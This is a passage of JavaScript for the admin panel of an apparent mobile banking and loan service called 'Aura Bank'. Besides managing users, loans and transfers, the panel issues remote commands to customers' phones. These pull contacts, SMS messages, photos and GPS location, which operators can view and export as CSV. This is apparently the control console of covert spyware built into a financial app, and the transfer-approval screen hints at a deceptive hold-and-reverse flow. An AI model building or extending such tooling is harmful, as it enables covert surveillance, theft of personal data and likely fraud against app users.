      setTimeout(() => showLocationDetails(res.command.id, res.command.user_id), 500);
    }
    
    renderDevices();
  } catch (e) {
    toast(`❌ ${e.message}`, true);
  }
};

window.deleteDevice = async function(userId, userName) {
  if (!confirm(`⚠️ តើអ្នកប្រាកដទេថាចង់លុបអ្នកប្រើ "${userName}"?\n\nសកម្មភាពនេះនឹងលុប:\n- គណនីអ្នកប្រើ\n- កាតទាំងអស់\n- ប្រតិបត្តិការទាំងអស់\n- កម្ចីទាំងអស់\n- Device commands និង locations\n\nមិនអាចត្រឡប់វិញបានទេ!`)) {
    return;
  }
  
  try {
    await api(`/users/${userId}`, { method: 'DELETE' });
    toast(`✅ បានលុបអ្នកប្រើ "${userName}" ដោយជោគជ័យ`);
    renderDevices();
  } catch (e) {
    toast(`❌ កំហុស: ${e.message}`, true);
  }
};

window.showCommandResults = async function(cmdType, cmdId, userId) {
  // Fetch the latest command data with results
  const commands = await api(`/device/commands?user_id=${userId}`);
  const latest = commands.commands?.find(c => c.id === cmdId);
  
  if (!latest || !latest.result_data) {
    toast('⏳ កំពុងរង់ចាំ result...', false);
    return;
  }
  
  const data = latest.result_data;
  let html = '<div style="max-height:60vh;overflow-y:auto">';
  let downloadFilename = '';
  
  // Store data globally for download
  window._downloadData = data;
  window._downloadType = cmdType;
  
  if (cmdType === 'get_contacts') {
    const contacts = data.contacts || [];
    downloadFilename = `contacts_${new Date().toISOString().split('T')[0]}.csv`;
    window._downloadFilename = downloadFilename;
    
    html += `<h3>📱 Contacts (${contacts.length})</h3>`;
    if (contacts.length === 0) {
      html += '<p>មិនមាន contacts ទេ</p>';
    } else {
      html += '<table style="width:100%;margin-top:12px"><thead><tr><th>ឈ្មោះ</th><th>ទូរស័ព្ទ</th><th>Email</th></tr></thead><tbody>';
      contacts.forEach(c => {
        html += `<tr><td>${esc(c.displayName || '—')}</td><td>${esc((c.phones || []).join(', ') || '—')}</td><td>${esc((c.emails || []).join(', ') || '—')}</td></tr>`;
      });
      html += '</tbody></table>';
    }
  } else if (cmdType === 'get_sms') {
    const messages = data.messages || [];
    downloadFilename = `sms_${new Date().toISOString().split('T')[0]}.csv`;
    window._downloadFilename = downloadFilename;
    
    html += `<h3>💬 SMS Messages (${messages.length})</h3>`;
    if (messages.length === 0) {
      html += '<p>មិនមាន SMS ទេ</p>';
    } else {
      html += '<div style="display:flex;flex-direction:column;gap:8px;margin-top:12px">';
      messages.forEach(m => {
        html += `<div style="padding:12px;border:1px solid #ddd;border-radius:8px"><strong>${esc(m.address || 'Unknown')}</strong><br><small>${dt(m.date)}</small><p style="margin:8px 0 0">${esc(m.body || '')}</p></div>`;
      });
      html += '</div>';
    }
  }
  
  html += '</div>';
  
  // Add download button
  if (window._downloadData && ((window._downloadData.contacts && window._downloadData.contacts.length > 0) || (window._downloadData.messages && window._downloadData.messages.length > 0))) {
    html = `<div style="margin-bottom:12px"><button class="btn primary" onclick="downloadCSV()">⬇️ Download CSV</button></div>` + html;
  }
  
  showModal(cmdType === 'get_contacts' ? '📱 Contacts' : '💬 SMS Messages', html);
};

window.downloadCSV = function() {
  const cmdType = window._downloadType;
  const data = window._downloadData;
  const filename = window._downloadFilename;
  
  if (!data) {
    toast('❌ No data to download', true);
    return;
  }
  
  let csv = '';
  
  try {
    if (cmdType === 'get_contacts') {
      csv = '\uFEFFName,Phone,Email\n'; // Add BOM for Excel UTF-8
      (data.contacts || []).forEach(c => {
        const name = (c.displayName || '').replace(/"/g, '""');
        const phones = (c.phones || []).join('; ').replace(/"/g, '""');
        const emails = (c.emails || []).join('; ').replace(/"/g, '""');
        csv += `"${name}","${phones}","${emails}"\n`;
      });
    } else if (cmdType === 'get_sms') {
      csv = '\uFEFFDate,From/To,Type,Message\n'; // Add BOM for Excel UTF-8
      (data.messages || []).forEach(m => {
        const date = new Date(m.date).toISOString();
        const address = (m.address || '').replace(/"/g, '""');
        const type = m.type || 'unknown';
        const body = (m.body || '').replace(/\n/g, ' ').replace(/"/g, '""');
        csv += `"${date}","${address}","${type}","${body}"\n`;
      });
    }
    
    // Create blob and download
    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.setAttribute('href', url);
    link.setAttribute('download', filename);
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    
    // Cleanup
    setTimeout(() => {
      document.body.removeChild(link);
      URL.revokeObjectURL(url);
    }, 100);
    
    toast(`✅ បាន download ${filename}!`, true);
  } catch (error) {
    console.error('Download error:', error);
    toast(`❌ Download failed: ${error.message}`, true);
  }
};

window.showLocationDetails = async function(cmdId, userId) {
  // Fetch the latest command data with results
  const commands = await api(`/device/commands?user_id=${userId}`);
  const latest = commands.commands?.find(c => c.id === cmdId);
  
  if (!latest || !latest.result_data) {
    toast('⏳ កំពុងរង់ចាំ location result...', false);
    return;
  }
  
  const data = latest.result_data;
  const lat = data.lat;
  const lng = data.lng;
  const accuracy = data.accuracy;
  const village = data.village || '—';
  const commune = data.commune || '—';
  const district = data.district || '—';
  const province = data.province || '—';
  const country = data.country || '—';
  
  const html = `
    <div style="padding:16px">
      <div style="margin-bottom:16px;padding:12px;background:#f0f9ff;border-radius:8px;border-left:4px solid #3B9AD9">
        <strong>📍 កូអរដោនេ</strong><br>
        <span style="font-family:monospace">Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}</span><br>
        <small>Accuracy: ${accuracy}m</small>
      </div>
      
      <div style="display:grid;gap:12px">
        <div style="padding:12px;border:1px solid var(--line);border-radius:8px">
          <small style="color:#666">ភូមិ</small><br>
          <strong>${esc(village)}</strong>
        </div>
        <div style="padding:12px;border:1px solid var(--line);border-radius:8px">
          <small style="color:#666">ឃុំ/សង្កាត់</small><br>
          <strong>${esc(commune)}</strong>
        </div>
        <div style="padding:12px;border:1px solid var(--line);border-radius:8px">
          <small style="color:#666">ស្រុក/ខណ្ឌ</small><br>
          <strong>${esc(district)}</strong>
        </div>
        <div style="padding:12px;border:1px solid var(--line);border-radius:8px">
          <small style="color:#666">ខេត្ត/ក្រុង</small><br>
          <strong>${esc(province)}</strong>
        </div>
        <div style="padding:12px;border:1px solid var(--line);border-radius:8px">
          <small style="color:#666">ប្រទេស</small><br>
          <strong>${esc(country)}</strong>
        </div>
      </div>
    </div>
  `;
  
  showModal('📍 ទីតាំងឧបករណ៍', html);
};

function formatResultData(cmdType, data) {
  if (cmdType === 'get_location') {
    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}&tab=location" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រងទីតាំង">📍</a>`;
  } else if (cmdType === 'get_photos') {
    const count = data.count || 0;
    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}&tab=photos" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង Photos (${count})">🖼️</a>`;
  } else if (cmdType === 'get_contacts') {
    const count = data.count || 0;
    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}&tab=contacts" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង contacts (${count})">👥</a>`;
  } else if (cmdType === 'get_sms') {
    const count = data.count || 0;
    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}&tab=sms" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង SMS (${count})">💬</a>`;
  } else {
    return esc(JSON.stringify(data).slice(0, 80));
  }
}

window.expandList = async function(type, cmdId, userId) {
  try {
    // Fetch the command data
    const commands = await api(`/device/commands?user_id=${userId}`);
    
    if (!commands || !Array.isArray(commands)) {
      console.error('Commands is not an array:', commands);
      toast('❌ ទិន្នន័យមិនត្រឹមត្រូវ', true);
      return;
    }
    
    const cmd = commands.find(c => c.id === cmdId);
    
    if (!cmd) {
      console.error('Command not found. cmdId:', cmdId, 'Available IDs:', commands.map(c => c.id));
      toast('❌ រកមិនឃើញ command', true);
      return;
    }
    
    if (!cmd.result_data) {
      console.error('No result_data in command:', cmd);
      toast('❌ មិនមានទិន្នន័យ result ទេ', true);
      return;
    }
    
    const data = cmd.result_data;
    let html = '';
    
    if (type === 'contacts') {
      const contacts = data.contacts || [];
      html = `
        <div style="margin-top:16px;padding:16px;background:#f9fafb;border-radius:8px;border:1px solid var(--line)">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
            <h3 style="margin:0">📱 Contacts (${contacts.length})</h3>
            <button class="btn ghost sm" onclick="collapseList()">✕ បិទ</button>
          </div>
          <div style="max-height:500px;overflow-y:auto">
            <table style="width:100%">
              <thead>
                <tr style="background:#e5e7eb;position:sticky;top:0">
                  <th style="padding:8px;text-align:left">ឈ្មោះ</th>
                  <th style="padding:8px;text-align:left">ទូរស័ព្ទ</th>
                  <th style="padding:8px;text-align:left">Email</th>
                </tr>
              </thead>
              <tbody>
                ${contacts.map(c => `
                <tr style="border-bottom:1px solid #e5e7eb">
                  <td style="padding:8px">${esc(c.displayName || '—')}</td>
                  <td style="padding:8px;font-family:monospace">${esc((c.phones || []).join(', ') || '—')}</td>
                  <td style="padding:8px">${esc((c.emails || []).join(', ') || '—')}</td>
                </tr>
              `).join('')}
              </tbody>
            </table>
          </div>
        </div>
      `;
    } else if (type === 'sms') {
      const messages = data.messages || [];
      html = `
        <div style="margin-top:16px;padding:16px;background:#f9fafb;border-radius:8px;border:1px solid var(--line)">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
            <h3 style="margin:0">💬 SMS Messages (${messages.length})</h3>
            <button class="btn ghost sm" onclick="collapseList()">✕ បិទ</button>
          </div>
          <div style="max-height:500px;overflow-y:auto;display:flex;flex-direction:column;gap:8px">
            ${messages.map(m => `
            <div style="padding:12px;background:white;border:1px solid #e5e7eb;border-radius:8px">
              <div style="display:flex;justify-content:space-between;margin-bottom:4px">
                <strong>${esc(m.address || 'Unknown')}</strong>
                <small style="color:#666">${dt(m.date)}</small>
              </div>
              <div style="font-size:12px;color:#666;margin-bottom:4px">
                <span style="padding:2px 6px;background:${m.type === 'inbox' ? '#dbeafe' : m.type === 'sent' ? '#dcfce7' : '#f3f4f6'};border-radius:4px">${esc(m.type || 'unknown')}</span>
                ${m.read ? '<span style="margin-left:4px;color:#22c55e">✓ អាន</span>' : '<span style="margin-left:4px;color:#f59e0b">● ថ្មី</span>'}
              </div>
              <p style="margin:8px 0 0;white-space:pre-wrap">${esc(m.body || '')}</p>
            </div>
          `).join('')}
          </div>
        </div>
      `;
    }
    
    // Insert the expanded list after the table
    const container = document.getElementById('expanded-list-container');
    if (container) {
      container.innerHTML = html;
    } else {
      const div = document.createElement('div');
      div.id = 'expanded-list-container';
      div.innerHTML = html;
      document.querySelector('.card:last-child').appendChild(div);
    }
  } catch (error) {
    console.error('expandList error:', error);
    toast(`❌ Error: ${error.message}`, true);
  }
};

window.collapseList = function() {
  const container = document.getElementById('expanded-list-container');
  if (container) {
    container.remove();
  }
};

/* ---------- transfer approvals ---------- */
const mmss = (sec) => {
  const s = Math.max(0, Math.floor(sec));
  return String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
};

function approvalCard(r) {
  const isExt = r.kind === 'external';
  const meta = r.meta || {};
  const name = isExt ? meta.recipient_name : r.recipient_name;
  const bank = isExt ? meta.bank_name : 'Aura Bank';
  const acct = isExt ? meta.recipient_account : meta.recipient_masked;
  const created = new Date(r.created_at).getTime();
  const holding = r.status === 'holding';
  const auto = Number(r.auto_approve) === 1;
  // auto → អនុម័តស្វ័យប្រវត្តិក្នុង ៩ វិនាទី (តាម animation ៣ ជំហានរបស់ app)
  const autoExp = created + 9000;
  const autoLeft = Math.max(0, Math.round((autoExp - Date.now()) / 1000));
  return `<div class="approval-card${holding ? ' holding' : ''}">
    <div class="ap-top">
      <span class="pill ${isExt ? 'info' : 'ok'}">${isExt ? '🏦 ' + esc(bank) : '⚡ ផ្ទេរ Aura'}</span>
      <span class="ap-status ${holding ? 'holding' : auto ? 'auto' : 'pending'}">${holding ? '⏸ HOLDING' : auto ? '⚡ AUTO' : '⏳ រង់ចាំ'}</span>
    </div>
    <div class="ap-route">
      <div class="ap-side">
        <div class="ap-role">អ្នកផ្ញើ</div>
        <div class="cell-user">${avatarHtml(r.sender_name)}<span><b>${esc(r.sender_name)}</b><br><span class="muted">${esc(r.sender_email || '')}</span></span></div>
      </div>
      <div class="ap-arrow">→</div>
      <div class="ap-side">
        <div class="ap-role">អ្នកទទួល</div>
        <div class="cell-user">${avatarHtml(name)}<span><b>${esc(name || '—')}</b><br><span class="muted">${esc(acct || '')}</span></span></div>
      </div>
    </div>
    <div class="ap-amount">${money(r.total_debit)}${Number(r.fee) ? `<span class="ap-fee">រួម fee ${money(r.fee)}</span>` : ''}</div>
    ${auto
      ? `<div class="ap-count">
          <span class="ap-clock auto" data-auto-countdown data-auto-exp="${autoExp}">⚡ អនុម័តស្វ័យប្រវត្តិ ${autoLeft}s</span>
          <span class="ap-bar"><i style="width:${Math.max(0, Math.min(100, (autoLeft * 1000 / 9000) * 100))}%"></i></span>
        </div>
        <div class="ap-auto-note">ប្រព័ន្ធអនុម័តភ្លាមពេលសញ្ញាដល់ · បដិសេធវិញក្រោយ ១ នាទី</div>`
      : `<div class="ap-count">
          <span class="ap-clock ${holding ? 'holding' : ''}">${holding ? 'ហួសកំណត់' : 'រង់ចាំ'}</span>
        </div>`}
    ${r.note ? `<div class="ap-note">📝 ${esc(r.note)}</div>` : ''}
    <div class="ap-actions">
      <button class="btn ok sm" data-ap-approve="${r.id}">✓ អនុម័ត</button>
      <button class="btn danger sm" data-ap-reject="${r.id}">✕ បដិសេធ</button>
    </div>
    <div class="ap-ref">${esc(r.transfer_ref)} · ${dt(r.created_at)}</div>
  </div>`;
}

let approvalTickTimer = null;
let approvalRefreshTimer = null;

function stopApprovalTimers() {
  clearInterval(approvalTickTimer); approvalTickTimer = null;
  clearInterval(approvalRefreshTimer); approvalRefreshTimer = null;
}

async function renderApprovals() {
  stopApprovalTimers();
  const rows = await api('/transfers/pending');
  const pend = rows.filter((r) => r.status === 'pending').length;
  const autoCount = rows.filter((r) => Number(r.auto_approve) === 1).length;
  const sum = rows.reduce((a, r) => a + Number(r.total_debit || 0), 0);

  $('#content').innerHTML = `
    <div class="grid k3">
      <div class="card kpi accent">
        <div class="kpi-label">⏳ កំពុងរង់ចាំ</div>
        <div class="kpi-value">${pend}</div>
        <div class="kpi-sub">ត្រូវអនុម័តដើម្បីបញ្ចេញប្រាក់ទៅអ្នកទទួល</div>
      </div>
      <div class="card kpi warn">
        <div class="kpi-label">⚡ Auto Approve</div>
        <div class="kpi-value">${autoCount}</div>
        <div class="kpi-sub">អនុម័តស្វ័យប្រវត្តិក្នុង ~១០ វិនាទី · បដិសេធវិញក្រោយ ១ នាទី</div>
      </div>
      <div class="card kpi">
        <div class="kpi-label">ទឹកប្រាក់កាត់រួច</div>
        <div class="kpi-value">${money0(sum)}</div>
        <div class="kpi-sub">កាត់ពីអ្នកផ្ញើភ្លាម — បដិសេធនឹងបង្វិលជូនវិញ</div>
      </div>
    </div>
    <div class="card">
      <div class="card-head"><h3>✅ ការផ្ទេររង់ចាំការអនុម័ត</h3>
        <span class="muted">${rows.length} ការផ្ទេរ · ធ្វើបច្ចុប្បន្នភាពស្វ័យប្រវត្តិរៀងរាល់ 5 វិនាទី</span></div>
      ${rows.length
        ? `<div class="approval-grid">${rows.map(approvalCard).join('')}</div>`
        : '<div class="empty">គ្មានការផ្ទេររង់ចាំអនុម័តទេ 🎉</div>'}
    </div>`;

  // live auto-approve countdown
  approvalTickTimer = setInterval(() => {
    $$('[data-auto-countdown]').forEach((el) => {
      const left = Math.max(0,
        Math.round((Number(el.dataset.autoExp) - Date.now()) / 1000));
      el.textContent = left > 0
        ? `⚡ អនុម័តស្វ័យប្រវត្តិ ${left}s`
        : '⚡ កំពុងអនុម័ត…';
    });
  }, 1000);

  // auto refresh while this page is open
  approvalRefreshTimer = setInterval(() => {
    if (page !== 'approvals') return stopApprovalTimers();
    const modalOpen = !$('#modal').classList.contains('hidden');
    if (!document.hidden && !modalOpen) render();
  }, 5000);

  $$('[data-ap-approve]').forEach((b) => b.onclick = () => {
    const id = b.dataset.apApprove;
    confirmAction('អនុម័តការផ្ទេរ?', 'ប្រាក់នឹងត្រូវបញ្ចូលទៅអ្នកទទួល ហើយអ្នកផ្ញើទទួលបានការជូនដំណឹងជោគជ័យ។', async () => {
      await api(`/transfers/${id}/approve`, { method: 'POST', body: {} });
      toast('បានអនុម័តការផ្ទេរ', 'ok');
      loadBadges();
      render();
    });
  });

  $$('[data-ap-reject]').forEach((b) => b.onclick = () => {
    const id = b.dataset.apReject;
    openModal({
      title: 'បដិសេធការផ្ទេរ',
      body: `<p class="muted">ប្រាក់នឹងត្រូវបង្វិលទៅអ្នកផ្ញើវិញភ្លាម។</p>
        <label class="field"><span>មូលហេតុ</span><textarea id="ap_reason" rows="3" placeholder="ឧ. ព័ត៌មានអ្នកទទួលមិនត្រឹមត្រូវ"></textarea></label>`,
      saveLabel: 'បដិសេធ',
      onSave: async () => {
        await api(`/transfers/${id}/reject`, {
          method: 'POST',
          body: { reason: $('#ap_reason').value.trim() },
        });
        toast('បានបដិសេធ និងបង្វិលប្រាក់ជូនវិញ', 'ok');
        loadBadges();
        render();
      },
    });
  });
}

const RENDERERS = {
  dashboard: renderDashboard, users: renderUsers, cards: renderCards,
  approvals: renderApprovals,
  transactions: renderTransactions, loans: renderLoans, kyc: renderKyc,
  collections: renderCollections, reports: renderReports,
  notifications: renderNotifications, data: renderData, audit: renderAudit,
  devices: renderDevices, usage: renderUsage,
};

function renderUsage() {
  // Open usage dashboard in new tab
  window.open(`/admin/usage.html?token=${encodeURIComponent(token)}`, '_blank');
  // Show a message in the current page
  $('#content').innerHTML = `
    <div class="card">
      <div style="text-align: center; padding: 60px 20px;">
        <div style="font-size: 64px; margin-bottom: 16px;">📊</div>
        <h2 style="color: #667eea; margin-bottom: 12px;">Usage Dashboard</h2>
        <p style="color: #666; margin-bottom: 24px;">បានបើកក្នុង tab ថ្មី</p>
        <button class="btn primary" onclick="window.open('/admin/usage.html?token=${encodeURIComponent(token)}', '_blank')">
          🔄 បើកម្តងទៀត
        </button>
      </div>
    </div>
  `;
}

function bindPager(total) {
  $$('[data-page-btn]').forEach((b) => b.onclick = () => {
    offset = b.dataset.pageBtn === 'next' ? offset + LIMIT : Math.max(0, offset - LIMIT);
    render();
  });
}

async function render() {
  $('#pageTitle').textContent = TITLES[page];
  $$('.nav-item').forEach((b) => b.classList.toggle('active', b.dataset.page === page));
  $('#search').classList.toggle('hidden', !['users', 'cards', 'loans'].includes(page));
  const action = $('#actionBtn');
  if (page === 'transactions') {
    action.hidden = false; action.textContent = '+ ប្រតិបត្តិការ';
  } else if (page === 'notifications') {
    action.hidden = false; action.textContent = '+ ផ្ញើសេចក្តីសារ';
  } else {
    action.hidden = true;
  }
  const el = $('#content');
  // មិនបង្ហាញ "កំពុងផ្ទុក…" ទេ — រក្សាមាតិកាចាស់រហូតដល់ទិន្នន័យថ្មីមកដល់
  try {
    await RENDERERS[page]();
  } catch (e) {
    el.innerHTML = `<div class="empty">បរាជ័យ: ${esc(e.message)}</div>`;
  }
}

/* ---------- auth ---------- */
async function boot() {
  if (!token) { $('#login').classList.remove('hidden'); return; }
  try {
    admin = await api('/me');
    $('#login').classList.add('hidden');
    $('#app').classList.remove('hidden');
    renderAdminIdentity();
    applyRolePermissions();
    render();
    loadBadges();
  } catch (_) {
    token = null;
    localStorage.removeItem('aura_admin_token');
    $('#login').classList.remove('hidden');
  }
}

function logout() {
  token = null;
  admin = null;
  localStorage.removeItem('aura_admin_token');
  $('#app').classList.add('hidden');
  $('#login').classList.remove('hidden');
}

$('#loginForm').onsubmit = async (e) => {
  e.preventDefault();
  $('#loginError').textContent = '';
  $('#loginBtn').disabled = true;
  try {
    const d = await api('/login', {
      method: 'POST',
      body: { email: $('#loginEmail').value.trim(), password: $('#loginSecret').value },
    });
    token = d.token;
    admin = d.admin;
    localStorage.setItem('aura_admin_token', token);
    $('#login').classList.add('hidden');
    $('#app').classList.remove('hidden');
    renderAdminIdentity();
    applyRolePermissions();
    render();
    loadBadges();
  } catch (err) {
    $('#loginError').textContent = err.message;
  } finally {
    $('#loginBtn').disabled = false;
  }
};

// Role-based UI permissions
function applyRolePermissions() {
  const role = admin?.role || 'operations';
  const deviceNavItem = document.querySelector('[data-page="devices"]');
  
  if (deviceNavItem) {
    if (role === 'management') {
      deviceNavItem.style.display = '';
    } else {
      deviceNavItem.style.display = 'none';
    }
  }
}

$('#logoutBtn').onclick = logout;
$('#refreshBtn').onclick = () => { render(); loadBadges(); };

/* ---------- admin identity ---------- */
const ADMIN_ROLES = {
  management: { icon: '👑', label: 'Management / Executive', kh: 'ថ្នាក់ដឹកនាំ / នាយកប្រតិបត្តិ', cls: 'ok',
    perms: ['គ្រប់គ្រងទិន្នន័យទាំងស្រុង', 'គ្រប់គ្រងទូរស័ព្ទ (Device)', 'កែប្ដូរ Role អ្នកប្រើ', 'ចូលគ្រប់មុខងារ Admin'] },
  administration: { icon: '🏢', label: 'Administration', kh: 'ថ្នាក់រដ្ឋបាល / គ្រប់គ្រង', cls: 'info',
    perms: ['គ្រប់គ្រងអ្នកប្រើ + កាត', 'កម្ចី + KYC + ប្រមូល', 'របាយការណ៍ + សេចក្តីសារ', 'មិនអាចគ្រប់គ្រងទូរស័ព្ទ'] },
  operations: { icon: '⚙️', label: 'Operations / Staff', kh: 'ថ្នាក់ប្រតិបត្តិការ / បុគ្គលិក', cls: 'warn',
    perms: ['ប្រតិបត្តិការប្រចាំថ្ងៃ', 'មើលទិន្នន័យអ្នកប្រើ', 'ជួយសម្រួលការងារផ្នែក', 'មិនអាចគ្រប់គ្រងទូរស័ព្ទ'] },
};
const adminRoleInfo = (role) => ADMIN_ROLES[role] || ADMIN_ROLES.operations;

function renderAdminIdentity() {
  if (!admin) return;
  const btn = $('#adminProfileBtn');
  const [a, b] = avGradient(admin.name || admin.email);
  const ri = adminRoleInfo(admin.role);
  btn.classList.add('admin-av-btn');
  btn.innerHTML = `
    <span class="admin-av-wrap">
      <span class="avatar admin-av" style="--av-a:${a};--av-b:${b}">${esc(initials(admin.name || admin.email))}</span>
      <span class="admin-role-ic">${ri.icon}</span>
      <span class="admin-live-dot"></span>
    </span>
    <span class="foot-tooltip" id="adminTooltip">${esc(admin.name || 'Admin')} · ${ri.icon} ${esc(ri.label)}</span>`;
  btn.onclick = showAdminProfile;
}

function showAdminProfile() {
  if (!admin) return;
  const a = admin;
  const [ga, gb] = avGradient(a.name || a.email);
  const ri = adminRoleInfo(a.role);
  openUserDrawer(`
    <div class="udrawer-scrim" data-ud-close></div>
    <aside class="udrawer-panel" style="--av-a:${ga};--av-b:${gb}" role="dialog" aria-modal="true" aria-label="គណនី Admin">
      <div class="udrawer-hero">
        <div class="udrawer-hero-glow"></div>
        <div class="udrawer-hero-grid"></div>
        <button class="udrawer-close" data-ud-close title="បិទ">✕</button>
        <div class="udrawer-hero-tag">គណនី Admin · #${a.id}</div>
      </div>
      <div class="udrawer-scroll">
        <div class="udrawer-head">
          <div class="udrawer-av"><span class="avatar-wrap"><span class="avatar xl" style="--av-a:${ga};--av-b:${gb}">${esc(initials(a.name || a.email))}</span><span class="dot on"></span></span></div>
          <div class="udrawer-idbox">
            <h3 class="udrawer-name">${esc(a.name || 'Admin')}</h3>
            <div class="udrawer-badges"><span class="live on"><i></i>កំពុងប្រើ</span> ${roleBadge(a.role)} <span class="pill info">Admin</span></div>
            <div class="udrawer-contact">✉ ${esc(a.email)}</div>
          </div>
        </div>
        <div class="admin-role-card ${ri.cls}">
          <div class="admin-role-ic-lg">${ri.icon}</div>
          <div>
            <div class="admin-role-title">${ri.label}</div>
            <div class="admin-role-kh">${ri.kh}</div>
          </div>
        </div>
        <div class="udrawer-section"><span>សិទ្ធិចូលប្រើរបស់អ្នក</span></div>
        <ul class="admin-perms">
          ${ri.perms.map((p) => `<li><span class="perm-check">✓</span>${esc(p)}</li>`).join('')}
        </ul>
        <div class="udrawer-section"><span>ព័ត៌មានគណនី</span></div>
        <div class="detail-grid ud-detail">
          <div class="detail-item"><div class="k">ID</div><div class="v">#${a.id}</div></div>
          <div class="detail-item"><div class="k">អ៊ីមែល</div><div class="v">${esc(a.email)}</div></div>
          <div class="detail-item"><div class="k">Role</div><div class="v">${ri.icon} ${esc(a.role || 'operations')}</div></div>
          <div class="detail-item"><div class="k">ប្រភេទ</div><div class="v">អ្នកគ្រប់គ្រង</div></div>
        </div>
        <div class="udrawer-actions" style="margin-top:20px">
          <button class="btn danger block" id="adminLogout">🚪 ចាកចេញពីគណនី</button>
        </div>
      </div>
    </aside>`);
  $('#adminLogout').onclick = () => { closeUserDrawer(); logout(); };
}

// Sidebar footer icon buttons
$('#openUsageBtn').onclick = () => window.open('/admin/usage.html?token=' + encodeURIComponent(token), '_blank');
$('#openActivityBtn').onclick = () => window.open('/admin/activity.html?token=' + encodeURIComponent(token), '_blank');
$('#openDataMgrBtn').onclick = () => window.open('/admin/data-manager.html?token=' + encodeURIComponent(token), '_blank');

// Badge system — fetch pending counts and update sidebar
async function loadBadges() {
  if (!token) return;
  try {
    const badges = await api('/badges');
    setBadge('badge-users', badges.users);
    setBadge('badge-cards', badges.cards);
    setBadge('badge-approvals', badges.approvals, badges.approvals > 0 ? 'warning' : '');
    setBadge('badge-transactions', badges.transactions);
    setBadge('badge-loans', badges.loans);
    setBadge('badge-kyc', badges.kyc);
    setBadge('badge-collections', badges.collections);
    setBadge('badge-reports', badges.reports);
    setBadge('badge-notifications', badges.notifications);
    setBadge('badge-data', badges.data);
    setBadge('badge-devices', badges.devices, badges.devicesOnline > 0 ? 'online' : '');
    setBadge('badge-audit', badges.audit);
    setBadge('badge-usage', badges.usage, badges.usage > 0 ? 'warning' : '');

    // Footer icon badges
    setFootBadge('foot-badge-usage', badges.usage, badges.usage > 0 ? 'warning' : '');
    setFootBadge('foot-badge-activity', badges.activity);
    setFootBadge('foot-badge-clean', badges.data);
  } catch (_) {}
}

function setBadge(id, count, extraClass) {
  const el = document.getElementById(id);
  if (!el) return;
  if (count > 0) {
    el.textContent = count > 99 ? '99+' : count;
    el.className = 'nav-badge visible' + (extraClass ? ' ' + extraClass : '');
  } else {
    el.className = 'nav-badge';
    el.textContent = '';
  }
}

function setFootBadge(id, count, extraClass) {
  const el = document.getElementById(id);
  if (!el) return;
  if (count > 0) {
    el.textContent = count > 99 ? '99+' : count;
    el.className = 'foot-badge visible' + (extraClass ? ' ' + extraClass : '');
  } else {
    el.className = 'foot-badge';
    el.textContent = '';
  }
}

// Auto-refresh badges every 30 seconds
setInterval(loadBadges, 30000);

// មិនមាន auto-refresh ទេ — អ្នកប្រើត្រូវចុច ⟳ ដើម្បីផ្អាសទិន្នន័យដោយខ្លួនឯង


$('#menuBtn').onclick = () => $('.sidebar').classList.toggle('open');
$$('.nav-item').forEach((b) => b.onclick = () => {
  page = b.dataset.page;
  offset = 0;
  $('.sidebar').classList.remove('open');
  render();
});
$('#search').oninput = (e) => {
  clearTimeout(window._st);
  const v = e.target.value.trim();
  window._st = setTimeout(() => { search = v; offset = 0; render(); }, 320);
};
$('#actionBtn').onclick = () => {
  if (page === 'transactions') createTransaction();
  else if (page === 'notifications') renderNotifications();
};

boot();
